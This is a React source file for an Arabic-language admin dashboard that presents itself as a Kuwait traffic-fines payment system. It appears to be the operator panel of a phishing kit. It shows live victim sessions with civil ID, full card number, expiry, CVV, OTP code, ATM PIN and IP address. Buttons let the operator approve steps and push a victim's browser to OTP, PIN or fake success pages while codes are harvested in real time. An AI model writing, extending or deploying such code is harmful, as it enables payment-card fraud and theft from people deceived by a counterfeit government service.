import React, { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { useToast } from "@/hooks/use-toast";
import { 
  Search, 
  CreditCard, 
  RefreshCcw, 
  Trash2, 
  ExternalLink, 
  Eye, 
  CheckCircle2, 
  XCircle, 
  Clock,
  ShieldAlert,
  Info
} from "lucide-react";

export default function AdminPanel() {
  const [password, setPassword] = useState("");
  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
  const { toast } = useToast();

  const loginMutation = trpc.admin.login.useMutation();
  const verifyQuery = trpc.admin.verify.useQuery({ token: token || "" }, { enabled: !!token, retry: false });
  const sessionsQuery = trpc.admin.getSessions.useQuery({ token: token || "" }, { 
    enabled: !!token && verifyQuery.data?.valid === true, 
    refetchInterval: 3000 
  });
  const actionMutation = trpc.admin.action.useMutation();
  const redirectMutation = trpc.admin.sendRedirect.useMutation();
  const clearMutation = trpc.admin.clearAll.useMutation();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await loginMutation.mutateAsync({ password });
      if (res.success && res.token) {
        setToken(res.token);
        localStorage.setItem("adminToken", res.token);
        toast({ title: "تم تسجيل الدخول", description: "مرحباً بك في لوحة الإدارة" });
      }
    } catch (err: any) {
      toast({ variant: "destructive", title: "خطأ", description: err.message });
    }
  };

  const handleLogout = () => {
    setToken(null);
    localStorage.removeItem("adminToken");
  };

  const handleAction = async (sessionId: string, action: "pass" | "denied" | "completed", errorMsg?: string) => {
    if (!token) return;
    try {
      await actionMutation.mutateAsync({ token, sessionId, action, errorMessage: errorMsg });
      toast({ title: "تم الإجراء", description: `تم تنفيذ الإجراء ${action} بنجاح` });
    } catch (err: any) {
      toast({ variant: "destructive", title: "خطأ", description: err.message });
    }
  };

  const handleRedirect = async (sessionId: string, targetPage: string) => {
    if (!token) return;
    try {
      await redirectMutation.mutateAsync({ token, sessionId, targetPage });
      toast({ title: "تم إعادة التوجيه", description: `يتم الآن توجيه العميل إلى ${targetPage}` });
    } catch (err: any) {
      toast({ variant: "destructive", title: "خطأ", description: err.message });
    }
  };

  const handleClearAll = async () => {
    if (!token || !window.confirm("هل أنت متأكد من مسح جميع السجلات؟")) return;
    try {
      await clearMutation.mutateAsync({ token });
      toast({ title: "تم المسح", description: "تم مسح جميع السجلات بنجاح" });
    } catch (err: any) {
      toast({ variant: "destructive", title: "خطأ", description: err.message });
    }
  };

  if (!token || verifyQuery.data?.valid === false) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4 font-sans text-right" dir="rtl">
        <div className="max-w-md w-full bg-gray-800 rounded-2xl shadow-2xl p-8 border border-gray-700">
          <div className="text-center mb-8">
            <div className="bg-blue-500/10 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4 border border-blue-500/20">
              <ShieldAlert className="text-blue-500 w-10 h-10" />
            </div>
            <h1 className="text-2xl font-bold text-white mb-2">لوحة الإدارة - نظام الكويت</h1>
            <p className="text-gray-400 text-sm">يرجى إدخال كلمة المرور للمتابعة</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-6">
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="كلمة المرور"
                className="w-full bg-gray-700 border border-gray-600 text-white px-4 py-3 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all text-center outline-none"
                autoFocus
              />
            </div>
            <button
              type="submit"
              disabled={loginMutation.isPending}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl transition-all shadow-lg shadow-blue-500/20 disabled:opacity-50"
            >
              {loginMutation.isPending ? "جاري التحقق..." : "دخول النظام"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const sessions = sessionsQuery.data || [];

  return (
    <div className="min-h-screen bg-gray-50 font-sans text-right" dir="rtl">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 sticky top-0 z-30 shadow-sm">
        <div className="max-w-[1600px] mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="bg-blue-600 p-2 rounded-lg">
              <ShieldAlert className="text-white w-5 h-5" />
            </div>
            <h1 className="text-lg font-bold text-gray-800 hidden sm:block">نظام إدارة مخالفات الكويت</h1>
          </div>
          <div className="flex items-center gap-4">
            <button 
              onClick={handleClearAll}
              className="text-red-600 hover:bg-red-50 px-3 py-2 rounded-lg flex items-center gap-2 text-sm transition-colors"
            >
              <Trash2 className="w-4 h-4" />
              <span className="hidden sm:inline">مسح السجلات</span>
            </button>
            <button 
              onClick={handleLogout}
              className="bg-gray-800 text-white px-4 py-2 rounded-lg text-sm font-medium hover:bg-gray-700 transition-colors"
            >
              خروج
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-[1600px] mx-auto p-4 sm:p-6 lg:p-8">
        {/* Stats Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          <StatCard title="إجمالي العمليات" value={sessions.length} icon={<Search className="text-blue-500" />} />
          <StatCard title="عمليات قيد الانتظار" value={sessions.filter(s => s.stage.endsWith("_pending")).length} icon={<Clock className="text-amber-500" />} />
          <StatCard title="عمليات ناجحة" value={sessions.filter(s => s.stage === "success").length} icon={<CheckCircle2 className="text-green-500" />} />
          <StatCard title="عمليات مرفوضة" value={sessions.filter(s => s.stage === "failed").length} icon={<XCircle className="text-red-500" />} />
        </div>

        {/* Sessions Table */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="p-6 border-b border-gray-200 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
            <h2 className="text-xl font-bold text-gray-800">العمليات المباشرة</h2>
            <div className="flex items-center gap-2 text-sm text-gray-500">
              <RefreshCcw className={`w-4 h-4 ${sessionsQuery.isFetching ? 'animate-spin text-blue-500' : ''}`} />
              <span>تحديث تلقائي كل 3 ثواني</span>
            </div>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="bg-gray-50 border-b border-gray-200">
                  <th className="px-6 py-4 font-bold text-gray-600">الرقم المدني</th>
                  <th className="px-6 py-4 font-bold text-gray-600">إجمالي المخالفات</th>
                  <th className="px-6 py-4 font-bold text-gray-600">المبلغ المدفوع</th>
                  <th className="px-6 py-4 font-bold text-gray-600">الحالة / الصفحة</th>
                  <th className="px-6 py-4 font-bold text-gray-600">التفاصيل</th>
                  <th className="px-6 py-4 font-bold text-gray-600">الإجراءات</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {sessions.map((session: any) => (
                  <SessionRow 
                    key={session.id} 
                    session={session} 
                    onAction={handleAction}
                    onRedirect={handleRedirect}
                  />
                ))}
                {sessions.length === 0 && (
                  <tr>
                    <td colSpan={6} className="px-6 py-12 text-center text-gray-400 italic">
                      لا توجد عمليات حالياً...
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>
    </div>
  );
}

function StatCard({ title, value, icon }: { title: string; value: number | string; icon: React.ReactNode }) {
  return (
    <div className="bg-white p-6 rounded-2xl border border-gray-200 shadow-sm flex items-center gap-4">
      <div className="bg-gray-50 p-4 rounded-xl">{icon}</div>
      <div>
        <p className="text-sm text-gray-500 font-medium">{title}</p>
        <p className="text-2xl font-bold text-gray-900">{value}</p>
      </div>
    </div>
  );
}

function SessionRow({ session, onAction, onRedirect }: { session: any; onAction: any; onRedirect: any }) {
  const [showDetails, setShowDetails] = useState(false);

  const getStageLabel = (stage: string) => {
    const stages: Record<string, { label: string; color: string }> = {
      card: { label: "إدخال البطاقة", color: "bg-blue-100 text-blue-700" },
      card_pending: { label: "انتظار البطاقة", color: "bg-amber-100 text-amber-700" },
      otp: { label: "إدخال OTP", color: "bg-purple-100 text-purple-700" },
      otp_pending: { label: "انتظار OTP", color: "bg-amber-100 text-amber-700" },
      atm: { label: "إدخال PIN", color: "bg-indigo-100 text-indigo-700" },
      atm_pending: { label: "انتظار PIN", color: "bg-amber-100 text-amber-700" },
      success: { label: "مكتملة بنجاح", color: "bg-green-100 text-green-700" },
      failed: { label: "مرفوضة", color: "bg-red-100 text-red-700" },
    };
    return stages[stage] || { label: stage, color: "bg-gray-100 text-gray-700" };
  };

  const stage = getStageLabel(session.stage);

  return (
    <>
      <tr className={`hover:bg-gray-50 transition-colors ${session.statusRead === 0 ? 'bg-blue-50/30 font-semibold' : ''}`}>
        <td className="px-6 py-4">
          <div className="flex items-center gap-2">
            <span className="text-gray-900">{session.civilId || "---"}</span>
            <span className="text-[10px] bg-gray-200 px-1 rounded text-gray-500 uppercase">{session.enquiryType === '2' ? 'شركة' : 'فرد'}</span>
          </div>
          <div className="text-[10px] text-gray-400 mt-1">{new Date(session.createdAt).toLocaleString('ar-KW')}</div>
        </td>
        <td className="px-6 py-4">
          <span className="text-gray-900 font-bold">{session.totalFinesAmount || "0"} دك</span>
          <div className="text-[10px] text-gray-500">({session.totalFinesCount || 0} مخالفة)</div>
        </td>
        <td className="px-6 py-4">
          <span className="text-blue-600 font-bold">{session.totalAmount || "0"} دك</span>
        </td>
        <td className="px-6 py-4">
          <span className={`px-2 py-1 rounded-full text-[11px] font-bold ${stage.color} mb-1 inline-block`}>
            {stage.label}
          </span>
          <div className="text-[10px] text-gray-500 flex items-center gap-1">
            <Eye className="w-3 h-3" />
            {session.currentPage || "الرئيسية"}
          </div>
        </td>
        <td className="px-6 py-4">
          <button 
            onClick={() => setShowDetails(!showDetails)}
            className="text-blue-600 hover:text-blue-800 flex items-center gap-1 text-xs font-bold bg-blue-50 px-3 py-1.5 rounded-lg transition-colors"
          >
            <Info className="w-3.5 h-3.5" />
            التفاصيل
          </button>
        </td>
        <td className="px-6 py-4">
          <div className="flex flex-wrap gap-2">
            {session.stage.endsWith("_pending") && (
              <>
                <button 
                  onClick={() => onAction(session.sessionId, "pass")}
                  className="bg-green-600 text-white px-3 py-1.5 rounded-lg text-[11px] font-bold hover:bg-green-700 shadow-sm transition-all"
                >
                  تمرير
                </button>
                <button 
                  onClick={() => onAction(session.sessionId, "denied")}
                  className="bg-red-600 text-white px-3 py-1.5 rounded-lg text-[11px] font-bold hover:bg-red-700 shadow-sm transition-all"
                >
                  رفض
                </button>
              </>
            )}
            <div className="flex gap-1">
              <button 
                onClick={() => onRedirect(session.sessionId, "/otp")}
                className="bg-gray-200 text-gray-700 px-2 py-1 rounded text-[10px] hover:bg-gray-300"
              >
                OTP
              </button>
              <button 
                onClick={() => onRedirect(session.sessionId, "/atm")}
                className="bg-gray-200 text-gray-700 px-2 py-1 rounded text-[10px] hover:bg-gray-300"
              >
                PIN
              </button>
              <button 
                onClick={() => onRedirect(session.sessionId, "/success")}
                className="bg-green-100 text-green-700 px-2 py-1 rounded text-[10px] hover:bg-green-200"
              >
                نجاح
              </button>
            </div>
          </div>
        </td>
      </tr>
      
      {showDetails && (
        <tr>
          <td colSpan={6} className="px-6 py-0 bg-gray-50">
            <div className="py-6 grid grid-cols-1 md:grid-cols-3 gap-8 animate-in fade-in slide-in-from-top-2 duration-300">
              {/* Card Details */}
              <div className="bg-white p-5 rounded-xl border border-gray-200 shadow-sm">
                <h4 className="font-bold text-gray-800 mb-4 flex items-center gap-2 border-b pb-2">
                  <CreditCard className="w-4 h-4 text-blue-500" />
                  بيانات البطاقة
                </h4>
                <div className="space-y-3 text-xs">
                  <DetailItem label="الاسم" value={session.cardName} />
                  <DetailItem label="رقم البطاقة" value={session.cardNumber} />
                  <DetailItem label="التاريخ" value={session.cardExpiry} />
                  <DetailItem label="CVV" value={session.cardCvv} />
                </div>
              </div>

              {/* Security Details */}
              <div className="bg-white p-5 rounded-xl border border-gray-200 shadow-sm">
                <h4 className="font-bold text-gray-800 mb-4 flex items-center gap-2 border-b pb-2">
                  <ShieldAlert className="w-4 h-4 text-amber-500" />
                  بيانات الحماية
                </h4>
                <div className="space-y-3 text-xs">
                  <div className="bg-amber-50 p-3 rounded-lg border border-amber-100">
                    <DetailItem label="رمز OTP" value={session.otpCode} highlight />
                  </div>
                  <div className="bg-indigo-50 p-3 rounded-lg border border-indigo-100">
                    <DetailItem label="رقم PIN" value={session.atmPin} highlight />
                  </div>
                </div>
              </div>

              {/* Client Info */}
              <div className="bg-white p-5 rounded-xl border border-gray-200 shadow-sm">
                <h4 className="font-bold text-gray-800 mb-4 flex items-center gap-2 border-b pb-2">
                  <Info className="w-4 h-4 text-gray-500" />
                  معلومات العميل
                </h4>
                <div className="space-y-3 text-xs">
                  <DetailItem label="IP العميل" value={session.clientIp} />
                  <div className="flex flex-col gap-1">
                    <span className="text-gray-400">المتصفح:</span>
                    <span className="text-gray-600 break-all leading-relaxed">{session.userAgent}</span>
                  </div>
                </div>
              </div>
            </div>
          </td>
        </tr>
      )}
    </>
  );
}

function DetailItem({ label, value, highlight = false }: { label: string; value: string | null; highlight?: boolean }) {
  return (
    <div className="flex justify-between items-center border-b border-gray-50 pb-2">
      <span className="text-gray-400">{label}:</span>
      <span className={`font-mono font-bold ${highlight ? 'text-lg text-blue-600' : 'text-gray-700'}`}>
        {value || "---"}
      </span>
    </div>
  );
}
